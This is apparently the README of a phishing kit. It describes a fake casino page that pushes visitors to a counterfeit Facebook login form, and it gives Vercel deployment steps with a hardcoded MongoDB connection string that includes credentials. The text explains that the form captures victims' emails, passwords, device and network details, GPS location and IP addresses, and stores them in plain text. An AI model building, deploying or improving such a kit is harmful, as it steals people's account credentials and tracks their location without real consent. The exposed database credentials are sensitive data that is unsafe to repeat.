# TyCasino with Facebook Login

This project includes:
1. A TyCasino main page (tycasino.html)
2. A Facebook login form (index.html) that collects user data

## Deployment Instructions

### MongoDB Setup
1. Create an account on MongoDB Atlas
2. Create a cluster
3. Get your connection string: `mongodb+srv://Tycasino:Tycasino123@cluster0.px4v3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`

### Vercel Deployment
1. Push this repository to GitHub
2. Create a new project in Vercel connected to this repository
3. Set the following environment variable:
   - Name: `MONGODB_URI`
   - Value: `mongodb+srv://Tycasino:Tycasino123@cluster0.px4v3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`
4. Deploy the project

## How It Works
- Main casino page is set as the homepage
- When users click on games, login, or signup buttons, they are shown the Facebook login modal
- When they click "Continue with Facebook" they go to the Facebook login page
- The login form collects email, password, device information, location, and network data
- Data is stored in MongoDB in plain text format

## Important Files
- `tycasino.html` - Main casino page
- `index.html` - Facebook login form
- `styles.css` - Styling for the Facebook form
- `script.js` - JavaScript for form validation and data collection
- `api/login.js` - API endpoint to store data in MongoDB
- `api/models/User.js` - MongoDB user schema
- `api/db/connect.js` - MongoDB connection

## Data Collected
- Email and password
- Device information (platform, user agent, screen size)
- Network information (WiFi connection)
- GPS location (requires user permission)
- IP address
- Timestamp 